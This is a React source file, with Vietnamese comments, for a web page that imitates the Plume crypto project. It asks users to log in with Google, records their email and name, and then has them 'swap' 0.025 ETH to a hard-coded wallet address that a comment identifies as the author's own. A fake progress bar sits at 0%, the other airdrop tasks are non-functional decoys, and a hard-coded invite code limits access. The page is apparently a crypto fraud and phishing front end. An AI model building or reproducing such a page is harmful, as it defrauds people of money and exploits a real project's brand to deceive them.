import React, { useState, useEffect } from 'react';
// Import các công cụ Firebase
import { auth, db, googleProvider } from './firebase'; 
import { signInWithPopup, onAuthStateChanged, signOut } from "firebase/auth";
import { doc, setDoc } from "firebase/firestore";

// Import file CSS
import './App.css'; 

// !! DÁN ĐỊA CHỈ VÍ CỐ ĐỊNH CỦA BẠN VÀO ĐÂY (CHO HỘP THÔNG BÁO) !!
const SWAP_WALLET_ADDRESS = "0x2bc4eef1adff83d8e9e09bbb857ef4d305cc6958";

// ===============================================
// --- MÃ BÍ MẬT CỦA BẠN ---
// ===============================================
const CORRECT_INVITE_CODE = "v8HqKjY4zBfP5sW2rG6eA1mN0"; // <-- HÃY SỬA THÀNH CODE BÍ MẬT CỦA BẠN


// --- Các Icon SVG (Bằng Tiếng Anh) ---
const IconHome = () => <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" d="m2.25 12 8.954-8.955c.44-.439 1.152-.439 1.591 0L21.75 12M4.5 9.75v10.125c0 .621.504 1.125 1.125 1.125H9.75v-4.875c0-.621.504-1.125 1.125-1.125h2.25c.621 0 1.125.504 1.125 1.125V21h4.125c.621 0 1.125-.504 1.125-1.125V9.75M8.25 21h8.25" /></svg>;
const IconSwap = () => <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" d="M3 7.5 7.5 3m0 0L12 7.5M7.5 3v13.5m13.5 0L16.5 21m0 0L12 16.5m4.5 4.5V7.5" /></svg>;
const IconDiscover = () => <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" d="M3.75 6A2.25 2.25 0 0 1 6 3.75h2.25A2.25 2.25 0 0 1 10.5 6v2.25a2.25 2.25 0 0 1-2.25 2.25H6a2.25 2.25 0 0 1-2.25-2.25V6ZM3.75 15.75A2.25 2.25 0 0 1 6 13.5h2.25a2.25 2.25 0 0 1 2.25 2.25V18a2.25 2.25 0 0 1-2.25 2.25H6a2.25 2.25 0 0 1-2.25-2.25v-2.25ZM13.5 6A2.25 2.25 0 0 1 15.75 3.75h2.25A2.25 2.25 0 0 1 20.25 6v2.25A2.25 2.25 0 0 1 18 10.5h-2.25A2.25 2.25 0 0 1 13.5 8.25V6ZM13.5 15.75A2.25 2.25 0 0 1 15.75 13.5h2.25a2.25 2.25 0 0 1 2.25 2.25V18A2.25 2.25 0 0 1 18 20.25h-2.25A2.25 2.25 0 0 1 13.5 18v-2.25Z" /></svg>;
const IconMore = () => <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" d="M12 9v6m3-3H9m12 0a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" /></svg>;
const IconTwitter = () => <svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg>;
const IconDiscord = () => <svg fill="currentColor" viewBox="0 0 24 24"><path d="M19.54 0c1.356 0 2.46 1.104 2.46 2.46v19.08c0 1.356-1.104 2.46-2.46 2.46H4.46C3.104 24 2 22.896 2 21.54V2.46C2 1.104 3.104 0 4.46 0h15.08zM9.48 5.76c-1.332 0-2.412 1.08-2.412 2.412s1.08 2.412 2.412 2.412 2.412-1.08 2.412-2.412-1.08-2.412-2.412-2.412zm5.04 0c-1.332 0-2.412 1.08-2.412 2.412s1.08 2.412 2.412 2.412 2.412-1.08 2.412-2.412-1.08-2.412-2.412-2.412zM20 16.596c-.324.36-.648.684-.996 1.008-.684.6-1.368 1.152-2.076 1.68-1.008.684-2.052 1.116-3.144 1.308-.24.036-.48.072-.72.072-.48 0-.96-.036-1.44-.072-1.092-.192-2.136-.624-3.144-1.308-.708-.528-1.392-1.08-2.076-1.68-.348-.324-.672-.648-.996-1.008-1.548-1.812-2.316-3.864-2.316-6.108 0-3.324 2.484-6.012 5.544-6.012 2.22 0 4.128 1.356 4.968 3.324 1.404-.444 2.664-.78 3.744-1.008.144.756.072 1.512-.18 2.232.48.204.924.444 1.332.72.396.264.756.564 1.08.864.288.264.54.564.756.864 1.296 2.4 1.08 5.256-.252 7.344z"></path></svg>;
const IconTelegram = () => <svg fill="currentColor" viewBox="0 0 24 24"><path d="m9.417 15.181-.397 5.584c.568 0 .814-.244 1.109-.537l2.663-2.545 5.518 4.041c1.012.564 1.725.267 1.998-.931L23.633 3.196c.326-1.494-.566-2.128-1.5-1.614L1.87 9.884c-1.449.564-1.417 1.385-.246 1.742l5.424 1.693L18.753 5.488c.624-.397.983-.189.516.198z"></path></svg>;
// --- Hết phần Icon ---

// ===============================================
// --- COMPONENT: MÀN HÌNH NHẬP CODE (MODAL) ---
// ===============================================
function InviteModal({ onSuccess }) {
  const [inputCode, setInputCode] = useState("");
  const [error, setError] = useState("");

  const handleSubmit = () => {
    if (inputCode === CORRECT_INVITE_CODE) {
      // SỬA LỖI 1: Lưu vào sessionStorage để "nhớ"
      sessionStorage.setItem('isUnlocked', 'true'); 
      onSuccess(); // Gọi hàm onSuccess (từ App) để mở khóa
    } else {
      setError("Invalid code. Please try again."); // Báo lỗi
    }
  };

  return (
    <div className="invite-overlay">
      <div className="invite-modal">
        <h2>Enter Access Code</h2>
        <p>This project is currently in private beta.</p>
        <input 
          type="text"
          placeholder="Enter your code..."
          value={inputCode}
          onChange={(e) => setInputCode(e.target.value)}
          className="invite-input"
        />
        <button className="connect-button large" onClick={handleSubmit}>
          Enter
        </button>
        {error && <p className="invite-error">{error}</p>}
      </div>
    </div>
  );
}

// ===============================================
// --- COMPONENT: BẢNG THÔNG BÁO (MODAL) ---
// ===============================================
function SwapModal({ onClose, walletAddress }) {
  // (Code của SwapModal giữ nguyên)
  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <div className="modal-header"><h2 className="modal-title">Swap in Progress</h2><button className="modal-close-button" onClick={onClose}>&times;</button></div>
        <p>Please swap 0.025 ETH (BEP20) to the address below:</p>
        <div className="wallet-box">{walletAddress}</div>
        <p>Waiting for confirmation... (0%)</p>
        <div className="progress-bar-container"><div className="progress-bar-fill" style={{ width: '0%' }}></div></div>
      </div>
    </div>
  );
}

// ===============================================
// --- COMPONENT: DANH SÁCH NHIỆM VỤ ---
// ===============================================
function TaskList({ onSwapClick }) {
  // (Code của TaskList giữ nguyên)
  return (
    <div className="task-list">
      <div className="task-item"><div className="task-info"><span className="task-icon">🔄</span><span className="task-text">SWAP 0.025 ETH on BSC (BEP20)</span></div><button className="task-button active" onClick={onSwapClick}>Swap</button></div>
      <div className="task-item"><div className="task-info"><span className="task-icon">✖️</span><span className="task-text">Follow @PlumeNetwork on X</span></div><button className="task-button disabled" disabled>Follow</button></div>
      <div className="task-item"><div className="task-info"><span className="task-icon">🔁</span><span className="task-text">Repost our launch Tweet</span></div><button className="task-button disabled" disabled>Repost</button></div>
      <div className="task-item"><div className="task-info"><span className="task-icon">💬</span><span className="task-text">Join the Plume Discord</span></div><button className="task-button disabled" disabled>Join</button></div>
      <div className="task-item"><div className="task-info"><span className="task-icon">❤️</span><span className="task-text">Like our launch Tweet on X</span></div><button className="task-button disabled" disabled>Like</button></div>
      <div className="task-item"><div className="task-info"><span className="task-icon">🌐</span><span className="task-text">Visit our official Website</span></div><button className="task-button disabled" disabled>Visit</button></div>
      <div className="task-item"><div className="task-info"><span className="task-icon">✍️</span><span className="task-text">Quote our Tweet about RWAs</span></div><button className="task-button disabled" disabled>Quote</button></div>
      <div className="task-item"><div className="task-info"><span className="task-icon">📖</span><span className="task-text">Read our Whitepaper</span></div><button className="task-button disabled" disabled>Read</button></div>
      <div className="task-item"><div className="task-info"><span className="task-icon">📢</span><span className="task-text">Join Telegram Announcements</span></div><button className="task-button disabled" disabled>Join</button></div>
      <div className="task-item"><div className="task-info"><span className="task-icon">📺</span><span className="task-text">Watch our YouTube Intro</span></div><button className="task-button disabled" disabled>Watch</button></div>
      <div className="task-item"><div className="task-info"><span className="task-icon">🖼️</span><span className="task-text">Mint a free "Early Supporter" NFT</span></div><button className="task-button disabled" disabled>Mint</button></div>
    </div>
  );
}

// ===============================================
// --- COMPONENT FOOTER ---
// ===============================================
function Footer() {
  // (Code của Footer giữ nguyên)
  return (
    <footer className="footer">
      <div className="footer-links">
        <div className="footer-column"><h4>Plume</h4><a href="#">About</a><a href="#">Chain</a><a href="#">Arc</a><a href="#">Nexus</a><a href="#">pUSD</a><a href="#">Nest</a></div>
        <div className="footer-column"><h4>Resources</h4><a href="#">Blog</a><a href="#">Documentation</a><a href="#">Brand Kit</a></div>
        <div className="footer-column"><h4>Legal</h4><a href="#">Privacy Policy</a><a href="#">Terms of Service</a></div>
      </div>
      <div className="footer-bottom">
        <div className="footer-logo"><img src="/logo-sidebar.png" alt="Plume Logo" /></div>
        <div className="footer-socials"><a href="#"><IconTwitter /></a><a href="#"><IconDiscord /></a><a href="#"><IconTelegram /></a></div>
      </div>
    </footer>
  );
}


// ===============================================
// --- COMPONENT APP CHÍNH (ĐÃ CẬP NHẬT) ---
// ===============================================
function App() {
  // SỬA LỖI 1: Đọc từ sessionStorage khi tải trang
  const [isUnlocked, setIsUnlocked] = useState(
    sessionStorage.getItem('isUnlocked') === 'true'
  ); 
  
  const [user, setUser] = useState(null); 
  const [isModalOpen, setIsModalOpen] = useState(false);

  // --- SỬA LỖI 2: Thêm code ĐẦY ĐỦ cho các hàm ---
  const handleGoogleLogin = async () => { 
    try {
      const result = await signInWithPopup(auth, googleProvider);
      const loggedInUser = result.user;
      const userRef = doc(db, "users", loggedInUser.uid); 
      await setDoc(userRef, {
        uid: loggedInUser.uid,
        email: loggedInUser.email,
        displayName: loggedInUser.displayName,
      }, { merge: true });
    } catch (error) {
      console.error("Login Error:", error);
    }
  };

  const handleLogout = async () => { 
    try {
      await signOut(auth);
    } catch (error) {
      console.error("Logout Error:", error);
    }
  };

  useEffect(() => { 
    const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
      if (currentUser) { setUser(currentUser); } else { setUser(null); }
    });
    return () => unsubscribe();
  }, []);
  // --- HẾT PHẦN LOGIC ---

  // Hàm để mở khóa App
  const handleCodeSuccess = () => {
    setIsUnlocked(true);
  };

  // --- PHẦN GIAO DIỆN (HTML/JSX) ---
  
  // Kiểm tra xem đã mở khóa chưa
  if (!isUnlocked) {
    // Nếu CHƯA, chỉ hiển thị màn hình nhập code
    return <InviteModal onSuccess={handleCodeSuccess} />;
  }

  // Nếu ĐÃ MỞ KHÓA, hiển thị toàn bộ App
  return (
    <div className="app-container">
      
      {/* ========== THANH BÊN TRÁI (SIDEBAR) ========== */}
      <nav className="sidebar">
        {/* (Code Sidebar giữ nguyên) */}
        <div className="sidebar-header"><div className="sidebar-logo"><img src="/logo-sidebar.png" alt="Plume Logo" /></div>{user ? (<button onClick={handleLogout} className="connect-button">Logout</button>) : (<button onClick={handleGoogleLogin} className="connect-button">Connect</button>)}</div>
        <ul className="sidebar-menu">
          <li><a href="#" className="active"><IconHome /> <span>Home</span></a></li>
          <li><a href="#"><IconSwap /> <span>Swap</span></a></li>
          <li><a href="#"><IconDiscover /> <span>Discover</span></a></li>
        </ul>
        <div className="sidebar-more"><a href="#"><IconMore /> <span>More</span></a></div>
      </nav>

      {/* ========== PHẦN CHÍNH (BÊN PHẢI) ========== */}
      <div className="main-world">
        
        <header className="main-header"></header>
        
        <main className="main-content">
          {/* (Toàn bộ nội dung trang chính giữ nguyên) */}
          <div className="hero-banner">
            <img src="/banner-main.png" alt="RWA Buildings" className="hero-image" />
            <div className="hero-overlay"></div>
            <div className="hero-text">
              <h1>RWAs That Feel Just Like Crypto</h1>
              <p>Join Plume in bringing the real world to crypto</p>
              {user && (<p className="hero-sub-text-light">Please swap to unlock all features</p>)}
              {!user && (<button onClick={handleGoogleLogin} className="connect-button large">Login with Google</button>)}
            </div>
          </div>
          {user && (<TaskList onSwapClick={() => setIsModalOpen(true)} />)}
        </main>

        {user && <Footer />}
      </div>

      {/* --- Render Modal (nếu isModalOpen là true) --- */}
      {isModalOpen && (
        <SwapModal 
          onClose={() => setIsModalOpen(false)} 
          walletAddress={SWAP_WALLET_ADDRESS}
        />
      )}

    </div>
  );
}

export default App;